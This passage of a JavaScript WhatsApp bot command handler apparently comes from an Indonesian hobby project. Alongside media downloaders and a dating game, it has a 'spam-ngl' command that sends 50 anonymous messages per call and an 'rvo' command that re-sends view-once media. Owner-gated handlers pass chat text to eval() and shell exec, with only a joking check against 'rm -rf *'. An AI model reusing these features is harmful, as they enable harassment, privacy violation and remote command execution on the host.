    if (cek1.length == 0) return reply("𝙉𝙪𝙢𝙗𝙚𝙧 𝙉𝙤𝙩 𝙁𝙤𝙪𝙣𝙙 🎗")      
    kontributor.push(prem1);
    await reaction(m.chat, "⚡")
    fs.writeFileSync('./start/lib/database/owner.json', JSON.stringify(kontributor));
    reply(mess.s); 
    conn.sendMessage(`${prem1}@s.whatsapp.net`, { 
        text: `*Congrats, You The New 𝙊𝙬𝙣𝙚𝙧 !!!*`},{quoted: glxNull }
           );
        }
        break;

case 'delowner': {
    if (isBan) return reply(`\`[ ! ]\` *You Have Been Banned*`)
    if (!Access) return reply(mess.owner);
    if (!args[0]) return reply(`𝙀𝙭𝙖𝙢𝙥𝙡𝙚 : ${prefix + command} 628888 🎗`);
    const prem2 = text.split("|")[0].replace(/[^0-9]/g, '');
            const unp = kontributor.indexOf(prem2);
            if (unp !== -1) {
                kontributor.splice(unp, 1);
                await reaction(m.chat, "⚡")
                fs.writeFileSync('./start/lib/database/owner.json', JSON.stringify(kontributor));
                reply(mess.s);
            } else {
                reply(mess.s);
            }
        }
        break;
            
        case 'public': {
            if (isBan) return reply(`\`[ ! ]\` *You Have Been Banned*`)
            if (!Access) return reply(mess.owner) 
            conn.public = true
            reply(mess.s)
        }
        break
            
        case 'self': {
            if (isBan) return reply(`\`[ ! ]\` *You Have Been Banned*`)
            if (!Access) return reply(mess.owner) 
            conn.public = false
            reply(mess.s)
        }
        break
            
case "jadibot": {
    if (isBan) return reply(`\`[ ! ]\` *You Have Been Banned*`)
    if (!Access && !isPremium) return reply(mess.premium)
    await reaction(m.chat, '✅')
    try {
        await jadibot(conn, m, m.sender)
    } catch (error) {
        await reply(util.format(error), command)
    }
}
break
                
case "stopjadibot": {
    if (isBan) return reply(`\`[ ! ]\` *You Have Been Banned*`)
    if (!Access && !isPremium) return reply(mess.premium)
    await reaction(m.chat, '✅')
    if (m.key.fromMe) return
    try {
        await stopjadibot(conn, m, m.sender)
    } catch (error) {
        await reply(util.format(error), command)
    }
}
break
			
case "listjadibot": {
    if (isBan) return reply(`\`[ ! ]\` *You Have Been Banned*`)
    if (!Access && !isPremium) return reply(mess.premium)
    if (m.key.fromMe) return
    try {
        listjadibot(conn, m)
    } catch (error) {
        await reply(util.format(error), command)
    }
}
break
                
case 'tourl': {
    if (isBan) return reply(`\`[ ! ]\` *You Have Been Banned*`)
    let q = m.quoted ? m.quoted : m
    let media = await quoted.download();
    await reaction(m.chat, "⚡")
    let uploadImage = require('./lib/uploadImage');
    let isTele = /image\/(png|jpe?g|gif)|video\/mp4/.test(mime);
    const uploadFile = require('./lib/uploadFile')
    let link = await (isTele ? uploadImage : uploadFile)(media);  
    conn.sendMessage(m.chat, {
        text : `🍿 *Link Catbox* :\n ${link}`
    },{quoted: glxNull })
}
break;       
            
case 'ping': {
    if (isBan) return reply(`\`[ ! ]\` *You Have Been Banned*`)
    const old = performance.now()
    const ram = (os.totalmem() / Math.pow(1024, 3)).toFixed(2) + " GB";
    const free_ram = (os.freemem() / Math.pow(1024, 3)).toFixed(2) + " GB";
    const serverInfo = `server information

> CPU : *${os.cpus().length} Core, ${os.cpus()[0].model}*
> Uptime : *${Math.floor(os.uptime() / 86400)} days*
> Ram : *${free_ram}/${ram}*
> Speed : *${(performance.now() - old).toFixed(5)} ms*`;
    conn.sendMessage(m.chat, {
        text: serverInfo
    },{ quoted: glxNull })
}
break;
        
case 'speedtest': {
    if (isBan) return reply(`\`[ ! ]\` *You Have Been Banned*`)
    await reaction(m.chat, "⚡")
    const exec = promisify(cp.exec).bind(cp);
    let o;
    try {
        o = await exec('python3 speed.py --share --secure');
    } catch (e) {
        o = e;
    } finally {
        const { stdout, stderr } = o;
        if (stdout.trim()) {
            conn.relayMessage(m.chat, {
                extendedTextMessage: {
                    text: stdout,
                    contextInfo: {
                        externalAdReply: {
                            title: "*S P E E D  T E S T*",
                            mediaType: 1,
                            previewType: 0,
                            renderLargerThumbnail: true,
                            thumbnailUrl: cinahitam,
                            sourceUrl: `https://google.com`
                        }
                    },
                    mentions: [m.sender]
                }
            }, {quoted: glxNull });
        }
        if (stderr.trim()) reply(stderr);
    }
}
break;

case 'disk': {
    if (isBan) return reply(`\`[ ! ]\` *You Have Been Banned*`)
    exec('cd && du -h --max-depth=1', (err, stdout) => {
        if (err) return reply(`${err}`);
        if (stdout) return reply(stdout);
    });
}
break;
            
case 'sticker':
case 's':
case 'stiker': {
    if (isBan) return reply(`\`[ ! ]\` *You Have Been Banned*`)
    if (!quoted) return reply(`𝙀𝙭𝙖𝙢𝙥𝙡𝙚 : ${prefix + command} 🎗`);
    try {
        if (/image/.test(mime)) {
            const media = await quoted.download();
            await reaction(m.chat, "⚡")
            const imageUrl = `data:${mime};base64,${media.toString('base64')}`;
            await makeStickerFromUrl(imageUrl, conn, m);
        } else if (/video/.test(mime)) {
            if ((quoted?.msg || quoted)?.seconds > 10) return reply('durasi video maksimal 10 detik!')
                const media = await quoted.download();
                const videoUrl = `data:${mime};base64,${media.toString('base64')}`;
                await makeStickerFromUrl(videoUrl, conn, m);
            } else {
                return reply('kirim gambar/video dengan caption .s (video durasi 1-10 detik)');
            }
        } catch (error) {
            console.error(error);
            return reply('terjadi kesalahan saat memproses media. Coba lagi.');
        }
    }
    break;
            
      case 'get':{
    if (isBan) return reply(`\`[ ! ]\` *You Have Been Banned*`)
        if (!/^https?:\/\//.test(text)) return reply(`𝙀𝙭𝙖𝙢𝙥𝙡𝙚 : ${prefix + command} https://raldzz.site 🎗`);
        const ajg = await fetch(text);
          await reaction(m.chat, "⚡")
        if (ajg.headers.get("content-length") > 100 * 1024 * 1024) {
            throw `Content-Length: ${ajg.headers.get("content-length")}`;
        }

        const contentType = ajg.headers.get("content-type");
        if (contentType.startsWith("image/")) {
            return conn.sendMessage(
                m.chat,
                { image: { url: text } },
                { quoted: glxNull }
            );
        }
        if (contentType.startsWith("video/")) {
            return conn.sendMessage(
                m.chat,
                { video: { url: text } },
                { quoted: glxNull  }
            );
        }
        if (contentType.startsWith("audio/")) {
            return conn.sendMessage(
                m.chat,
                { audio: { url: text },
                mimetype: 'audio/mpeg', 
                ptt: true
                },
                { quoted: glxNull }
            );
        }
        
        let alak = await ajg.buffer();
        try {
            alak = util.format(JSON.parse(alak + ""));
        } catch (e) {
            alak = alak + "";
        } finally {
            return reply(alak.slice(0, 65536));
        }
      }
      break
        
      case 'open':
      case 'buka': {
          if (!m.isGroup) return reply(mess.group)
          if (!isAdmins && !Access) return reply(mess.admin)
          if (!isBotAdmins) return m.tolak(mess.botadmin)
          conn.groupSettingUpdate(m.chat, 'not_announcement')
          reply(mess.s)
      }
      break
                
      case 'close':
      case 'tutup': {
          if (!m.isGroup) return reply(mess.group)
          if (!isAdmins && !Access) return reply(mess.admin)
          if (!isBotAdmins) return m.tolak(mess.botadmin)
          conn.groupSettingUpdate(m.chat, 'announcement')
          reply(mess.s)
      }
      break
            
      case 'totag':{
        if (isBan) return reply(`\`[ ! ]\` *You Have Been Banned*`)
        if (!isAdmins) return reply(mess.admin);
        if (!m.isGroup) return reply(mess.group);
        if (!m.quoted) return reply(`𝙍𝙚𝙥𝙡𝙮 𝙈𝙚𝙨𝙨𝙖𝙜𝙚𝙨 🎗`);
        const groupMetadata = await conn.groupMetadata(m.chat);
        const participants = groupMetadata.participants;

        conn.sendMessage(m.chat, {
            forward: m.quoted.fakeObj,
            mentions: participants.map((a) => a.id)
           }, { quoted: glxNull });
         }
        break
            
    case 'igdl':
    case 'ig': {
        if (isBan) return reply(`\`[ ! ]\` *You Have Been Banned*`);
        if (!text) return reply(`𝙀𝙭𝙖𝙢𝙥𝙡𝙚 : ${prefix + command} https://www.instagram.com/reel/DB8BGCZRKAh/?igsh=eDk1ajRncDV6Mjdh 🎗`);
    
        let memek = await igdl(text);
        await reaction(m.chat, "⚡");
    
        let respon = memek.data;
        if (respon && respon.length > 0) {
        
            let uniqueUrls = new Set(respon.map(item => item.url));
            try {
                for (let mediaUrl of uniqueUrls) {
                    const headResponse = await axios.head(mediaUrl);
                    const mimeType = headResponse.headers['content-type'];

                    const isImage = /image\/.*/.test(mimeType);
                    const isVideo = /video\/.*/.test(mimeType);

                    if (isImage) {
                        await conn.sendMessage(m.chat, {
                            image: { url: mediaUrl },
                            caption: mess.s
                        }, { quoted: glxNull });
                    } else if (isVideo || mimeType === 'application/octet-stream') {
                        await conn.sendMessage(m.chat, {
                            video: { url: mediaUrl },
                            caption: mess.s
                        }, { quoted: glxNull });
                    } else {
                        await conn.sendMessage(m.chat, {
                            text: `*${mimeType}* 𝙉𝙤𝙩 𝙁𝙤𝙪𝙣𝙙 🎗`
                        }, { quoted: glxNull });
                    }
                }
            } catch (error) {
                console.error('Error fetching media type:', error);
                reply(error)
            }
        } else {
            await conn.sendMessage(m.chat, {
                text: "𝙉𝙤𝙩 𝙁𝙤𝙪𝙣𝙙 🎗"
            }, { quoted: glxNull });
        }
    }
    break;
      
      case 'fb':
      case 'fbdl':
      case 'facebook':{
          if (isBan) return reply(`\`[ ! ]\` *You Have Been Banned*`)
          if (!text) return reply(`𝙀𝙭𝙖𝙢𝙥𝙡𝙚 : ${prefix + command} https://www.facebook.com/share/r/12BFZAtjpS8/?mibextid=qDwCgo 🎗`)
          let woii = await fetchJson(`https://api.siputzx.my.id/api/d/facebook?url=${text}`)
          await reaction(m.chat, "⚡")
          let hitam = woii.data;
          let peler = hitam.video;
          let anunya = hitam.userInfo.name
          conn.sendMessage(m.chat, { 
              video: { url: peler }, 
              caption: `𝗦𝗼𝘂𝗿 : ${anunya}` }, 
           { quoted: glxNull }
         );
      }
      break
                
      case'ai':
      case'gemini':
      case'openai':
      case'chatgpt':{
        if (isBan) return reply(`\`[ ! ]\` *You Have Been Banned*`)
        if (!text) return reply(`𝙀𝙭𝙖𝙢𝙥𝙡𝙚 : ${prefix + command} tutor jadi pacar msbrewc 🎗`)
          let cuki = await fetchJson(`https://api.siputzx.my.id/api/ai/gpt3?prompt=kamu%20adalah%20ai%20yang%20tolol%20dan%20lucu%20buatan%20RaldzzXyz&content=${text}`)
          await reaction(m.chat, "⚡")
          let mamad = cuki.data
          conn.sendMessage(m.chat, { text : mamad }, {quoted: glxNull })
      }
      break
            
      case'tiktok':
      case'ttdl':{
        if (isBan) return reply(`\`[ ! ]\` *You Have Been Banned*`)
        if (!text) return reply(`𝙀𝙭𝙖𝙢𝙥𝙡𝙚 : ${prefix + command} https://tiktok.com// 🎗`);
         let res = await await fetchJson(`https://api.hyuunewbie.my.id/api/ttdl?url=${text}`);
          await reaction(m.chat, "⚡")
         if (res && res.data) {
            let images = res.data.images || [];
            let play = res.data.play;
            let lagu = res.data.music_info.play;

            const getMimeType = async (url) => {
                try {
                    const response = await axios.head(url);
                    return response.headers['content-type'];
                } catch (error) {
                    console.error(error);
                    return
                }
            };

            let mimeType = await getMimeType(play);
            
            if (mimeType && mimeType.startsWith('video/')) {
                await conn.sendMessage(m.chat, {
                    video: { url: play },
                    caption: mess.s
                },{quoted: glxNull });
            } else if (images.length > 0) {
                let totalImages = images.length;
                let estimatedTime = totalImages * 4;
                let message = `𝙀𝙨𝙩𝙞𝙢𝙖𝙩𝙞𝙤𝙣 𝙎𝙚𝙣𝙙𝙞𝙣𝙜 ${estimatedTime} 𝙎𝙚𝙘𝙤𝙣𝙙 🎗`;
                await conn.sendMessage(m.chat, { text: message },{quoted: glxNull });

                const sendImageWithDelay = async (url, index) => {
                    let caption = `𝙄𝙢𝙖𝙜𝙚 𝙏𝙤 ${index + 1} 🎗`;
                    await conn.sendMessage(m.chat, { image: { url }, caption: caption },{quoted: glxNull });
                };
                await conn.sendMessage(m.chat, { audio: { url: lagu }, mimetype: "audio/mpeg" },{quoted: glxNull })

                for (let i = 0; i < images.length; i++) {
                    await sendImageWithDelay(images[i], i);
                    await new Promise(resolve => setTimeout(resolve, 4000));
                }
            } else {
                console.log('𝙉𝙤𝙩 𝙁𝙤𝙪𝙣𝙙 🎗');
                await conn.sendMessage(m.chat, {
                    text: "𝙉𝙤𝙩 𝙁𝙤𝙪𝙣𝙙 🎗"
                },{quoted:m});
            }
        } else {
            console.error('Error: Invalid response structure', res);
            await conn.sendMessage(m.chat, {
                text: "No media found or an error occurred while retrieving media."
            },{quoted: glxNull });
        }
      }
      break
            
      case 'pindl':{
        if (isBan) return reply(`\`[ ! ]\` *You Have Been Banned*`)
        if (!text) return reply(`𝙀𝙭𝙖𝙢𝙥𝙡𝙚 : .pindl https://pin.it/1DyLc8cGU 🎗`);
        let res = await fetchJson(`https://api.siputzx.my.id/api/d/pinterest?url=${text}`);
          await reaction(m.chat, "⚡")
        let mek = res.data;

        if (mek && mek.url) {
            const mediaUrl = mek.url;
            const isImage = mediaUrl.match(/\.(jpeg|jpg|png|gif)$/i);
            const isVideo = mediaUrl.match(/\.(mp4|webm|ogg)$/i);

            if (isImage) {
                await conn.sendMessage(m.chat, {
                    image: { url: mediaUrl },
                    caption: mess.s
                }, { quoted: glxNull });
            } else if (isVideo) {
                await conn.sendMessage(m.chat, {
                    video: { url: mediaUrl },
                    caption: mess.s
                }, { quoted: glxNull });
            } else {
                await conn.sendMessage(m.chat, {
                    text: "𝙉𝙤𝙩 𝙁𝙤𝙪𝙣𝙙 🎗"
                }, { quoted: glxNull });
            }
        } else {
            await conn.sendMessage(m.chat, {
                text: "𝙉𝙤𝙩 𝙁𝙤𝙪𝙣𝙙 🎗"
            }, { quoted: glxNull });
        }
      }
      break          

      case 'spam-ngl':{
        if (isBan) return reply(`\`[ ! ]\` *You Have Been Banned*`)
        if (!text) return reply(`𝙀𝙭𝙖𝙢𝙥𝙡𝙚 : .spam-ngl username heked bai gweh 🎗`)
        let peler = text.split("|")[0]
        let laso = text.split("|")[1]
        for (let j = 0; j < 50; j++) {
        await spamngl(peler, laso)
        }
          await reaction(m.chat, "⚡")
        conn.sendMessage(m.chat, {
            text: mess.s
          },{quoted: glxNull })
      }
      break
            
        case 'brat':{
            if (!isPremium && users.limit < 0) return reply(mess.limited); 
            users.limit -= 1;
            if (isBan) return reply(`\`[ ! ]\` *You Have Been Banned*`)
            if (!text) return reply(`𝙀𝙭𝙖𝙢𝙥𝙡𝙚 : .brat woi hytam 🎗`)
            const imageUrl = `https://brat.caliphdev.com/api/brat?text=${text}`;
            await reaction(m.chat, "⚡")
            await makeStickerFromUrl(imageUrl, conn, m);
        }
       break
    
    case 'play':{
        if(!text) return reply(`𝙀𝙭𝙖𝙢𝙥𝙡𝙚 : .play baoncikadap 🎗`)
        try {
        const search = await yts(text);
        const telaso = search.all[0].url;
        const result = await fetchJson(`https://api.siputzx.my.id/api/d/ytmp3?url=${telaso}`);
        const puqii = result.data.dl;
        await reaction(m.chat, '⚡');
        await conn.sendMessage(m.chat, {
            audio: { url: puqii },
            mimetype: 'audio/mpeg',
            fileName: 'Wide Awake.mp3',
            contextInfo: {
                forwardingScore: 100000,
                isForwarded: true,
                externalAdReply: {
                    showAdAttribution: false,
                    containsAutoReply: true,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                    title: result.data.title,
                    body: ``,
                    previewType: "PHOTO",
                    thumbnailUrl: 'https://telegra.ph/file/e6e5a3bbe152c54f6ac65.jpg',
                }
            }
        }, { quoted: glxNull });
    } catch (error) {
        console.error('Error:', error);
        await conn.sendMessage(m.chat, { text: 'an error occurred while processing your request.' }, { quoted: m });
    }
    }
    break
                
      case 'delete':
      case 'd':
      case 'del': {
        if (isBan) return reply(`\`[ ! ]\` *You Have Been Banned*`)
	    if (!m.quoted) return reply('𝙍𝙚𝙥𝙡𝙮 𝙈𝙚𝙨𝙨𝙖𝙜𝙚𝙨 🎗')
          await conn.sendMessage(m.chat, {
              delete: {
                  remoteJid: m.chat,
                  id: m.quoted.id,
                  participant: m.quoted.sender
              }
          })
      }
	  break
                
      case 'q':
      case 'quoted': {
        if (isBan) return reply(`\`[ ! ]\` *You Have Been Banned*`)
          if (!m.quoted) return reply('𝙍𝙚𝙥𝙡𝙮 𝙈𝙚𝙨𝙨𝙖𝙜𝙚𝙨 🎗')
          let gwm = await conn.serializeM(await m.getQuotedObj())
          if (!gwm.quoted) return reply('𝙉𝙤𝙩 𝙁𝙤𝙪𝙣𝙙 🎗')
          await gwm.quoted.copyNForward(m.chat, true)
      }
      break

      case 'tovn': {
        if (isBan) return reply(`\`[ ! ]\` *You Have Been Banned*`)
        if (!/video/.test(mime) && !/audio/.test(mime)) return reply(`𝙍𝙚𝙥𝙡𝙮 𝙈𝙚𝙨𝙨𝙖𝙜𝙚𝙨 🎗`);
        if (!quoted) return reply(`𝙍𝙚𝙥𝙡𝙮 𝙈𝙚𝙨𝙨𝙖𝙜𝙚𝙨 🎗`);
        await reaction(m.chat, "⚡")
        await sleep(5000);
        let media = await quoted.download();
        let { toAudio } = require('./lib/converter');
        let audio = await toAudio(media, 'mp4');
        conn.sendMessage(m.chat, { audio, mimetype: 'audio/mpeg', ptt: true }, { quoted: glxNull });
      }
        break;

    case 'jadian': {
        if (isBan) return reply(`\`[ ! ]\` *You Have Been Banned*`);
        if (!m.isGroup) return reply(mess.group);
        conn.jadian = conn.jadian ? conn.jadian : {};
        let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
        if (!text) return reply(`𝙏𝙖𝙜 𝙎𝙤𝙢𝙚𝙤𝙣𝙚 🎗`)
        if (users === m.sender) return reply("𝙆𝙤𝙣𝙩𝙤𝙡 🎗");
        if (users === botNumber) return reply("𝙆𝙤𝙣𝙩𝙤𝙡 🎗");

        if (!global.db.data.users[users]) global.db.data.users[users] = { pacar: null };
        if (!global.db.data.users[m.sender]) global.db.data.users[m.sender] = { pacar: null };

        let pasangan = global.db.data.users[users].pacar;
        let pasangan2 = global.db.data.users[m.sender].pacar;

        if (pasangan2 === users) {
            reply(`itu kan pacar lu`);
        } else if (pasangan) {
            reply(`udaa ada pacarnya njirr!\n\nwoii @${pasangan.split("@")[0]}, ayangmu mau diambil`);
        } else if (pasangan2) {
            reply(`lakh, mau selingkuh?\n\nwoii @${pasangan2.split("@")[0]}, lihat nih, dia mau selingkuh`);
        } else {
        
        const ktnmbk = [
    "Ada saat di mana aku nggak suka sendiri. Tapi aku juga nggak mau semua orang menemani, hanya kamu yang kumau.",
    "Aku baru sadar ternyata selama ini kamu kaya! Kaya yang aku cari selama ini. Kamu mau nggak jadi pacarku?",
    "Aku berterima kasih pada mataku, sebab mata inilah yang menuntunku untuk menemukanmu.",
    "Aku boleh kirim CV ke kamu nggak? Soalnya aku mau ngelamar jadi pacar.",
    "Aku bukan yang terhebat, namun aku yakin kalau aku mampu membahagiakanmu dengan bermodalkan cinta dan kasih sayang. Kamu mau kan denganku?",
    "Aku hanya cowok biasa yang memiliki banyak kekurangan dan mungkin tak pantas mengharapkan cintamu. Namun, jika kamu bersedia menerimaku menjadi kekasih, aku berjanji akan melakukan apa pun yang terbaik untukmu. Maukah kamu menerima cintaku?",
    "Aku ingin bilang sesuatu. Udah lama aku suka sama kamu, tapi aku nggak berani ngomong. Jadi, kuputuskan untuk WA saja. Aku pengin kamu jadi pacarku.",
    "Aku ingin mengungkapkan sebuah hal yang tak sanggup lagi aku pendam lebih lama. Aku mencintaimu, maukah kamu menjadi pacarku?",
    "Aku ingin menjadi orang yang bisa membuatmu tertawa dan tersenyum setiap hari. Maukah kau jadi pacarku?",
    "Aku mau chat serius sama kamu. Selama ini aku memendam rasa ke kamu dan selalu memperhatikanmu. Kalau nggak keberatan, kamu mau jadi pacarku?",
    "Aku melihatmu dan melihat sisa hidupku di depan mataku.",
    "Aku memang tidak mempunyai segalanya, tapi setidaknya aku punya kasih sayang yang cukup buat kamu.",
    "Aku menyukaimu dari dulu. Kamu begitu sederhana, tetapi kesederhanaan itu sangat istimewa di selaput mataku. Akan sempurna jika kamu yang menjadi spesial di hati.",
    "Aku naksir banget sama kamu. Maukah kamu jadi milikku?",
    "Aku nggak ada ngabarin kamu bukan karena aku nggak punya kuota atau pulsa, tapi lagi menikmati rasa rindu ini buat kamu. Mungkin kamu akan kaget mendengarnya. Selama ini aku menyukaimu.",
    "Aku nggak pengin kamu jadi matahari di hidupku, karena walaupun hangat, kamu sangat jauh. Aku juga nggak mau kamu jadi udara, karena walaupun aku butuh dan kamu sangat dekat, tapi semua orang juga bisa menghirupmu. Aku hanya ingin kamu jadi darah yang bisa sangat dekat denganku.",
    "Aku nggak tahu sampai kapan usiaku berakhir. Yang aku tahu, cintaku ini selamanya hanya untukmu.",
    "Aku sangat menikmati waktu yang dihabiskan bersama hari ini. Kita juga sudah lama saling mengenal. Di hari yang cerah ini, aku ingin mengungkapkan bahwa aku mencintaimu.",
    "Aku selalu membayangkan betapa indahnya jika suatu saat nanti kita dapat membina bahtera rumah tangga dan hidup bersama sampai akhir hayat. Namun, semua itu tak mungkin terjadi jika kita berdua sampai saat ini bahkan belum jadian. Maukah kamu menjadi kekasihku?",
    "Aku siapkan mental untuk hari ini. Kamu harus menjadi pacarku untuk mengobati rasa cinta yang sudah tak terkendali ini.",
    "Aku tahu kita nggak seumur, tapi bolehkah aku seumur hidup sama kamu?",
    "Aku tahu kita sudah lama sahabatan. Tapi nggak salah kan kalau aku suka sama kamu? Apa pun jawaban kamu aku terima. Yang terpenting itu jujur dari hati aku yang terdalam.",
    "Aku tak bisa memulai ini semua terlebih dahulu, namun aku akan berikan sebuah kode bahwa aku menyukai dirimu. Jika kau mengerti akan kode ini maka kita akan bersama.",
    "Aku yang terlalu bodoh atau kamu yang terlalu egois untuk membuat aku jatuh cinta kepadamu.",
    "Apa pun tentangmu, tak pernah kutemukan bosan di dalamnya. Karena berada di sampingmu, anugerah terindah bagiku. Jadilah kekasihku, hey kamu.",
    "Atas izin Allah dan restu mama papa, kamu mau nggak jadi pacarku?",
    "Bagaimana kalau kita jadi komplotan pencuri? Aku mencuri hatimu dan kau mencuri hatiku.",
    "Bahagia itu kalau aku dan kamu telah menjadi kita.",
    "Besok kalau udah nggak gabut, boleh nggak aku daftar jadi pacar kamu? Biar aku ada kerjaan buat selalu mikirin kamu.",
    "Biarkan aku membuatmu bahagia selamanya. Kamu hanya perlu melakukan satu hal: jatuh cinta denganku.",
    "Biarkan semua kebahagiaanku menjadi milikmu, semua kesedihanmu menjadi milikku. Biarkan seluruh dunia menjadi milikmu, hanya kamu yang menjadi milikku!",
    "Biarlah yang lalu menjadi masa laluku, namun untuk masa kini maukah kamu menjadi masa depanku?",
    "Bisakah kamu memberiku arahan ke hatimu? Sepertinya aku telah kehilangan diriku di matamu.",
    "Bukanlah tahta ataupun harta yang aku cari, akan tetapi balasan cintaku yang aku tunggu darimu. Dijawab ya.",
    "Caramu bisa membuatku tertawa bahkan di hari-hari tergelap membuatku merasa lebih ringan dari apa pun. Aku mau kamu jadi milikku.",
    "Cinta aku ke kamu itu jangan diragukan lagi karena cinta ini tulus dari lubuk hati yang paling dalam.",
    "Cintaku ke kamu tuh kayak angka 5 sampai 10. Nggak ada duanya. Aku mau kamu jadi satu-satunya wanita di hatiku.",
    "Cowok mana yang berani-beraninya nyakitin kamu? Sini aku obati, asal kamu mau jadi pacar aku."
];
					let katakata = await pickRandom(ktnmbk)
				    let teks = `love message...\n\n> @${m.sender.split("@")[0]}\n❤️❤️\n@${users.split("@")[0]}\n\n"${katakata}"`
					conn.jadian[users] = [
						reply(),
						m.sender
					]
                    let hehe = `kamu baru saja mengajak @${users.split("@")[0]} jadian\n\n@${users.split("@")[0]} silahkan beri keputusan🎉\n${prefix}terima atau ${prefix}tolak`
                    conn.sendMessage(m.chat, {
                        text: hehe,
                        footer: "© RaldzzXyz",
                        buttons: [ 
                            {
                                buttonId: `${prefix}terima`,
                                buttonText: {
                                    displayText: 'terima' 
                                }, type: 1 },
                            {
                                buttonId: `${prefix}tolak`,
                                buttonText: {
                                    displayText: 'ogah'
                                }, type: 1 }
                        ],
                        headerType: 1,
                        viewOnce: true
                        },{ quoted: glxNull })
                }
			}
			break
                
			case 'terima': {
                if (isBan) return reply(`\`[ ! ]\` *You Have Been Banned*`)
				if (!m.isGroup) return reply(mess.group)
				if (conn.jadian[m.sender]) {
					let user = conn.jadian[m.sender][1]
					global.db.data.users[user].pacar = m.sender
					global.db.data.users[m.sender].pacar = user
					reply(`horeee\n\n${m.sender.split("@")[0]} jadian dengan\n❤️ ${user.split("@")[0]}\n\nsemoga langgeng 🙈😋`)
					delete conn.jadian[m.sender]
				} else {
					reply(`horeee\n\n${m.sender.split("@")[0]} jadian dengan\n❤️ ${user.split("@")[0]}\n\nsemoga langgeng 🙈😋`)
				}
			}
			break
                
			case 'tolak': {
                if (isBan) return reply(`\`[ ! ]\` *You Have Been Banned*`)
				if (!m.isGroup) return reply(mess.group)
				if (conn.jadian[m.sender]) {
					let user = conn.jadian[m.sender][1]
					reply(`@${user.split("@")[0]} awogawogawog di tolak dong sumpah ngakak wkwkwkwkwk sabar yah lek jan bundir`)
					delete conn.jadian[m.sender]
				} else {
					reply(`@${user.split("@")[0]} awogawogawog di tolak dong sumpah ngakak wkwkwkwkwk sabar yah lek jan bundir`)
				}
			}
			break
                
			case 'putus': {
                if (isBan) return reply(`\`[ ! ]\` *You Have Been Banned*`)
				if (!m.isGroup) return reply(mess.group)
				let pasangan = global.db.data.users[m.sender].pacar
				if (pasangan) {
					global.db.data.users[m.sender].pacar = ""
					global.db.data.users[pasangan].pacar = ""
					reply(`horeee kamu putus sama @${pasangan.split("@")[0]}`)
				} else {
					reply(`horeee kamu putus sama @${pasangan.split("@")[0]}`)
				}
			}
			break
                
			case 'cekpacar': {
                if (isBan) return reply(`\`[ ! ]\` *You Have Been Banned*`)
				if (!m.isGroup) return reply(mess.group)
				try {
					let user = m.mentionedJid[0] || (m.quoted ? m.quoted.sender : "");
					if (!user) return reply(`tag/reply seseorang, contoh: ${prefix + command} @628888`)
					let pasangan = global.db.data.users[user].pacar
					if (pasangan) {
						reply(`@${user.split("@")[0]} udah ❤️ sama @${pasangan.split("@")[0]}`)
					} else {
						reply(`@${user.split("@")[0]} masih jomblo`)
					}
				} catch (error) {
                      let user = m.mentionedJid[0] || (m.quoted ? m.quoted.sender : "");
					reply(`@${user.split("@")[0]} tidak ada didalam database njrrr`)
				}
			}
			break
                
case "rvo": {
if (!m.quoted) return reply(`𝙀𝙭𝙖𝙢𝙥𝙡𝙚 : Reply ViewOnce with caption ${prefix + command} 🎗`);
try {
let buffer = await m.quoted.download();
let type = m.quoted.mtype;
let sendOptions = { quoted: m };
if (type === "videoMessage") {
await conn.sendMessage(m.chat, { video: buffer, caption: m.quoted.text || "" }, sendOptions);
} else if (type === "imageMessage") {
await conn.sendMessage(m.chat, { image: buffer, caption: m.quoted.text || "" }, sendOptions);
} else if (type === "audioMessage") {
await conn.sendMessage(m.chat, { 
audio: buffer, 
mimetype: "audio/mpeg", 
ptt: m.quoted.ptt || false 
}, sendOptions);
} else {
return reply(`𝙑𝙞𝙚𝙬 𝙊𝙣𝙘𝙚 𝙉𝙤𝙩 𝙁𝙤𝙪𝙣𝙙 🎗`)
}} catch (err) {
console.error(err)}}
break


default:
if (body.startsWith("~")) {
    if (!Access) return;
    reply('*execute...*')
    function Return(sul) {
        let sat = JSON.stringify(sul, null, 2);
        let bang = util.format(sat);
        if (sat === undefined) {
            bang = util.format(sul);
        }
        return bang;
    }
    try {
        (async () => {
            try {
                const result = await eval(`(async () => { return ${text} })()`);
                reply(Return(result));
            } catch (e) {
                reply(util.format(e));
            }
        })();
    } catch (e) {
        reply(util.format(e));
    }
}
			
if (budy.startsWith("X")) {
    if (!Access) return
    await reaction(m.chat, '⚡')
    try {
        let evaled = await eval(q);
        if (typeof evaled !== "string") evaled = util.inspect(evaled);
        await reply(evaled);
    } catch (e) {
        await reply(`Error: ${String(e)}`);
    }
}
                
if (budy.startsWith('-')) {
    if (!Access) return
    await reaction(m.chat, '⚡')
    if (text == "rm -rf *") return m.reply("😹")
    exec(budy.slice(2), (err, stdout) => {
        if (err) return m.reply(`${err}`)
        if (stdout) return m.reply(stdout)  
    })
}
 
}
} catch (err) {
        console.log(require("util").format(err));
    }
};

let file = require.resolve(__filename)
require('fs').watchFile(file, () => {
  require('fs').unwatchFile(file)
  console.log('\x1b[0;32m'+__filename+' \x1b[1;32mupdated!\x1b[0m')
  delete require.cache[file]
  require(file)
})